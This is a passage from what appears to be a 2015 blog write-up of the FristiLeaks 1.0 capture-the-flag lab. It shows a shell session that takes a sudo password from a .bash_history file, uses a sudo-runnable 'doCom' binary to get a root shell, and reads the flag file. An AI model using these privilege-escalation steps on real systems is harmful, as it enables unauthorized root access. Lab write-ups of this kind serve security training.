+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ cat .bash_history
+</span><span class='line'>cat .bash_history
+</span><span class='line'>ls
+</span><span class='line'>pwd
+</span><span class='line'>ls -lah
+</span><span class='line'>cd .secret_admin_stuff/
+</span><span class='line'>ls
+</span><span class='line'>./doCom
+</span><span class='line'>./doCom test
+</span><span class='line'>sudo ls
+</span><span class='line'>exit
+</span><span class='line'>cd .secret_admin_stuff/
+</span><span class='line'>ls
+</span><span class='line'>./doCom
+</span><span class='line'>sudo -u fristi ./doCom ls /
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'>exit
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>exit
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>exit
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>exit
+</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>exit
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>exit
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>groups
+</span><span class='line'>ls -lah
+</span><span class='line'>usermod -G fristigod fristi
+</span><span class='line'>exit
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>less /var/log/secure e
+</span><span class='line'>Fexit
+</span><span class='line'>exit
+</span><span class='line'>exit
+</span><span class='line'>
+</span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'>[sudo] password for fristigod: LetThereBeFristi!
+</span><span class='line'>
+</span><span class='line'>bin   dev  home  lib64       media  opt   root  selinux  sys  usr
+</span><span class='line'>boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
+</span><span class='line'>bash-4.1$
+</span><span class='line'>
+</span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
+</span><span class='line'>uid=0(root) gid=100(users) groups=100(users),502(fristigod)
+</span><span class='line'>
+</span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
+</span><span class='line'>sh-4.1# id
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=100(users) groups=100(users),502(fristigod)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally the flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.1# cat /root/fristileaks_secrets.txt
+</span><span class='line'>cat /root/fristileaks_secrets.txt
+</span><span class='line'>Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+</span><span class='line'>
+</span><span class='line'>I wonder if you beat it in the maximum 4 hours it's supposed to take!
+</span><span class='line'>
+</span><span class='line'>Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Flag: Y0u_kn0w_y0u_l0ve_fr1st1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks for this challenge, it took me nearly 2 hours to finish.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Norbert Szetei</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-12-15T08:45:49+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:45 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3/" data-via="" data-counturl="http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/12/12/sickos-1-dot-1/" title="Previous Post: SickOs: 1.1">&laquo; SickOs: 1.1</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Norbert Szetei -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
